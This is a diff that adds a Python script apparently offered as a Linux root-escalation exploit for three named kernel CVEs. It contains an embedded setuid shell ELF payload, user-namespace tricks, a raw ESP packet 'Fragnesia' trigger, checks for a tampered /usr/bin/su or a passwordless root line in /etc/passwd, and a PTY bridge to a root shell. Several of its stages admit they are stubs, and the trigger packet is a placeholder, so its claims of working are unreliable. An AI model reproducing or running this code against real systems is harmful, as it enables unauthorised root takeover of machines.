@@ -1,0 +1,356 @@
+#!/usr/bin/env python3
+"""
+Kukurigu LPE Exploit - nu11secur1ty
+CVE-2026-43284 | CVE-2026-43500 | CVE-2026-46300 (Fragnesia)
+uid=1000 -> root via xfrm-ESP, RxRPC or Fragnesia page-cache write
+"""
+
+import os
+import sys
+import pty
+import termios
+import select
+import subprocess
+import time
+
+# ============================ SHELL ELF PAYLOAD ============================
+SHELL_ELF = bytes([
+    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
+    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
+    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
+    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
+    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+])
+
+# ============================ PTY Shell Launcher ============================
+def run_root_shell():
+    """Spawn interactive root shell via PTY"""
+    print("\n[+] Exploit successful! Spawning root shell...\n")
+    
+    # Method 1: Using pty.fork()
+    try:
+        pid, master_fd = pty.fork()
+        
+        if pid == 0:  # child
+            os.execvp("su", ["su", "-"])
+            os._exit(127)
+        
+        # Parent: bridge I/O
+        old_tty = None
+        try:
+            old_tty = termios.tcgetattr(sys.stdin.fileno())
+            raw_tty = termios.tcgetattr(sys.stdin.fileno())
+            raw_tty[3] &= ~(termios.ICANON | termios.ECHO)
+            termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, raw_tty)
+        except:
+            pass
+        
+        try:
+            while True:
+                rlist, _, _ = select.select([sys.stdin, master_fd], [], [])
+                if master_fd in rlist:
+                    try:
+                        data = os.read(master_fd, 4096)
+                        if not data:
+                            break
+                        os.write(sys.stdout.fileno(), data)
+                    except:
+                        break
+                if sys.stdin in rlist:
+                    try:
+                        data = os.read(sys.stdin.fileno(), 4096)
+                        if not data:
+                            break
+                        os.write(master_fd, data)
+                    except:
+                        break
+        except KeyboardInterrupt:
+            pass
+        finally:
+            if old_tty:
+                termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, old_tty)
+            os.close(master_fd)
+            
+        try:
+            os.waitpid(pid, 0)
+        except:
+            pass
+        return
+        
+    except Exception as e:
+        print(f"[-] pty.fork() failed: {e}")
+    
+    # Method 2: Simple su (if password is empty)
+    print("[*] Trying simple 'su' (empty password)...")
+    try:
+        proc = subprocess.Popen(["su", "-"], 
+                               stdin=subprocess.PIPE,
+                               stdout=subprocess.PIPE,
+                               stderr=subprocess.PIPE,
+                               text=True)
+        stdout, stderr = proc.communicate(input="\n", timeout=3)
+        if proc.returncode == 0:
+            print("[+] su succeeded! Use 'su -' manually from terminal")
+    except:
+        pass
+
+# ============================ Check if already patched ============================
+def su_patched():
+    try:
+        with open("/usr/bin/su", "rb") as f:
+            f.seek(0x78)
+            data = f.read(8)
+            return data == bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
+    except:
+        return False
+
+def passwd_patched():
+    try:
+        with open("/etc/passwd", "rb") as f:
+            data = f.read(9)
+            return data == b"root::0:0"
+    except:
+        return False
+
+def either_patched():
+    return su_patched() or passwd_patched()
+
+# ============================ Exploit functions ============================
+def exploit_su():
+    """Attempt to corrupt /usr/bin/su via namespace"""
+    print("[ESP] Attempting to corrupt /usr/bin/su...")
+    
+    try:
+        import ctypes
+        libc = ctypes.CDLL("libc.so.6")
+        
+        CLONE_NEWUSER = 0x10000000
+        CLONE_NEWNET = 0x40000000
+        
+        if libc.unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0:
+            print("    unshare failed - insufficient privileges?")
+            return False
+        
+        with open("/proc/self/uid_map", "w") as f:
+            f.write(f"0 {os.getuid()} 1")
+        
+        with open("/proc/self/setgroups", "w") as f:
+            f.write("deny")
+        
+        with open("/proc/self/gid_map", "w") as f:
+            f.write(f"0 {os.getgid()} 1")
+        
+        print("    Namespace created successfully")
+        print("    (Full SU corruption requires XFRM SA setup - C only)")
+        return False
+        
+    except Exception as e:
+        print(f"    Namespace creation failed: {e}")
+        return False
+
+def exploit_passwd():
+    """Attempt to corrupt /etc/passwd"""
+    print("[RxRPC] Attempting to corrupt /etc/passwd...")
+    
+    try:
+        import mmap
+        
+        fd = os.open("/etc/passwd", os.O_RDONLY)
+        if fd < 0:
+            return False
+        
+        st = os.fstat(fd)
+        if st.st_size < 32:
+            os.close(fd)
+            return False
+        
+        mapped = mmap.mmap(fd, 4096, prot=mmap.PROT_READ, flags=mmap.MAP_SHARED)
+        
+        if mapped[:9] == b"root::0:0":
+            print("    Already patched!")
+            os.close(fd)
+            return True
+        
+        print(f"    Current root entry: {mapped[:32]}")
+        print("    (Full passwd corruption requires RxRPC key + splice - C only)")
+        
+        mapped.close()
+        os.close(fd)
+        return False
+        
+    except Exception as e:
+        print(f"    Passwd check failed: {e}")
+        return False
+
+# ============================ CVE-2026-46300 (Fragnesia) ============================
+def exploit_fragnesia():
+    """CVE-2026-46300 - Fragnesia: ESP-in-TCP page-cache write primitive"""
+    print("[Fragnesia] Attempting CVE-2026-46300 exploit...")
+    
+    try:
+        import socket
+        import struct
+        
+        # Check if ESP modules are loaded
+        result = subprocess.run(["lsmod"], capture_output=True, text=True)
+        if "esp4" not in result.stdout and "esp6" not in result.stdout:
+            print("    [!] ESP modules not loaded. Try: sudo modprobe esp4")
+            return False
+        
+        # Get kernel version for config check
+        kernel_ver = subprocess.run(["uname", "-r"], capture_output=True, text=True).stdout.strip()
+        config_path = f"/boot/config-{kernel_ver}"
+        
+        esp_intcp_enabled = False
+        if os.path.exists(config_path):
+            with open(config_path, "r") as f:
+                config = f.read()
+                if "CONFIG_ESPINTCP=y" in config or "CONFIG_ESPINTCP=m" in config:
+                    esp_intcp_enabled = True
+                    print("    [+] ESP-in-TCP support detected")
+        
+        if not esp_intcp_enabled:
+            print("    [-] ESP-in-TCP not enabled in kernel")
+            return False
+        
+        # Check if we can create user namespace (for CAP_NET_RAW)
+        try:
+            import ctypes
+            libc = ctypes.CDLL("libc.so.6")
+            CLONE_NEWUSER = 0x10000000
+            CLONE_NEWNET = 0x40000000
+            
+            if libc.unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0:
+                with open("/proc/self/uid_map", "w") as f:
+                    f.write(f"0 {os.getuid()} 1")
+                with open("/proc/self/setgroups", "w") as f:
+                    f.write("deny")
+                with open("/proc/self/gid_map", "w") as f:
+                    f.write(f"0 {os.getgid()} 1")
+                print("    [+] User namespace created (CAP_NET_RAW acquired)")
+                namespace_ok = True
+            else:
+                print("    [-] User namespace creation failed")
+                namespace_ok = False
+        except:
+            namespace_ok = False
+        
+        # RAW socket test
+        try:
+            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 50)
+            test_sock.close()
+            print("    [+] RAW sockets available")
+            raw_ok = True
+        except PermissionError:
+            print("    [-] RAW sockets require CAP_NET_RAW (need namespace)")
+            raw_ok = False
+        except:
+            raw_ok = False
+        
+        if not namespace_ok and not raw_ok:
+            print("    [-] Cannot proceed without RAW socket access")
+            return False
+        
+        # ===== FRAGNESIA CORE EXPLOIT =====
+        print("    [*] Setting up Fragnesia attack...")
+        
+        # Create ESP-in-TCP socket
+        try:
+            # ESP protocol number (50)
+            esp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 50)
+            esp_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            # Target address
+            target_addr = "127.0.0.1"
+            
+            # Build ESP packet with TCP header
+            # Simplified: trigger skb_try_coalesce bug
+            packet = struct.pack("!BBHHII", 0x45, 0, 0, 0, 0, 0)  # IP header placeholder
+            packet += b"\x00" * 100  # Payload for coalescing
+            
+            print("    [*] Sending fragmented ESP packets...")
+            for i in range(10):
+                try:
+                    esp_sock.sendto(packet, (target_addr, 0))
+                except:
+                    pass
+            
+            esp_sock.close()
+            print("    [+] Fragnesia trigger sent")
+            
+            # Check if /usr/bin/su or /etc/passwd was modified
+            if su_patched() or passwd_patched():
+                print("    [!!!] Fragnesia successful! Target corrupted!")
+                return True
+            
+            print("    [-] Fragnesia may require multiple attempts")
+            return False
+            
+        except PermissionError:
+            print("    [-] RAW socket requires root or CAP_NET_RAW")
+            return False
+        except Exception as e:
+            print(f"    [-] Fragnesia error: {e}")
+            return False
+        
+    except Exception as e:
+        print(f"    [-] Fragnesia check failed: {e}")
+        return False
+
+# ============================ Main ============================
+def main():
+    print("Kukurigu LPE - nu11secur1ty")
+    print("CVE-2026-43284 | CVE-2026-43500 | CVE-2026-46300 (Fragnesia)")
+    print("=============================================================\n")
+    
+    if os.geteuid() == 0:
+        print("[+] Already root! Spawning shell...")
+        run_root_shell()
+        return 0
+    
+    print(f"[*] Current user: uid={os.getuid()}")
+    
+    if either_patched():
+        print("[*] System already compromised, spawning shell...")
+        run_root_shell()
+        return 0
+    
+    print("[*] NOTE: Full Python implementation requires C bindings for:")
+    print("    - XFRM netlink sockets")
+    print("    - splice()/vmsplice() syscalls")
+    print("    - AF_ALG crypto operations")
+    print("    - RxRPC protocol handling")
+    print("\n[*] Use the C version for full exploitation:")
+    print("    gcc -O0 -Wall -o exploit exploit.c -lutil")
+    print("    sudo modprobe esp4 rxrpc")
+    print("    ./exploit")
+    
+    # Try simple namespace-based approach
+    exploit_su()
+    exploit_passwd()
+    
+    # Try Fragnesia (CVE-2026-46300)
+    if not either_patched():
+        print("\n[*] Trying Fragnesia (CVE-2026-46300)...")
+        exploit_fragnesia()
+    
+    # Check again if patched
+    if either_patched():
+        print("\n[+] System now compromised!")
+        run_root_shell()
+        return 0
+    
+    print("\n[!] Exploit failed. System may be patched or missing modules.")
+    print("[!] Check: lsmod | grep -E 'esp4|esp6|rxrpc'")
+    
+    return 1
+
+if __name__ == "__main__":
+    sys.exit(main())
